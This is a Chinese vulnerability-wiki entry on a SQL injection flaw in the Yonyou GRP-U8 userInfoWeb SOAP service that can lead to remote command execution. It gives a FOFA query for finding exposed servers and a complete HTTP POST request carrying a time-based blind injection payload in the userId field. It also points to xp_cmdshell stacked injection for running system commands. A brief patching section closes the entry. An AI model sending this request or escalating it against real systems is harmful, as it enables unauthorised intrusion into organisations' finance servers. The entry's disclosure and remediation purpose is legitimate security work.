---
fofa: "app=\"用友-GRP-U8\""
source: "互联网公开漏洞整理 202309-202406（VulWiki 仓库内汇总条目 §43）"
---

# 用友 GRP-U8 userInfoWeb SQL注入致RCE漏洞

# 漏洞描述

用友 GRP-U8 /services/userInfoWeb 接口 getUserNameById 方法 userId 参数存在 SQL 注入漏洞。攻击者可通过时间盲注执行任意 SQL 语句，并可进一步利用 MSSQL 的 xp_cmdshell 等机制执行系统命令，获取服务器控制权。

# 影响版本

用友 GRP-U8

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 未公开 | 未知 |

# 漏洞复现

FOFA：app="用友-GRP-U8"

POC/EXP：

```
POST /services/userInfoWeb HTTP/1.1
Host: {{Hostname}}
Content-Type: text/xml;charset=UTF-8
SOAPAction: ""
Accept-Encoding: gzip, deflate
Connection: close

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsdd="http://wsdd">
<soapenv:Body>
<wsdd:getUserNameById>
<userId xsi:type="xsd:string" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">';waitfor delay '0:0:5'--</userId>
</wsdd:getUserNameById>
</soapenv:Body>
</soapenv:Envelope>
```

若响应延迟约 5 秒，则存在时间盲注；确认注入后可通过 MSSQL 堆叠注入调用 xp_cmdshell 执行系统命令。

# 漏洞修复

联系用友官方获取安全补丁，对 userId 参数使用预编译语句并做严格过滤，禁用数据库账号的高危权限。
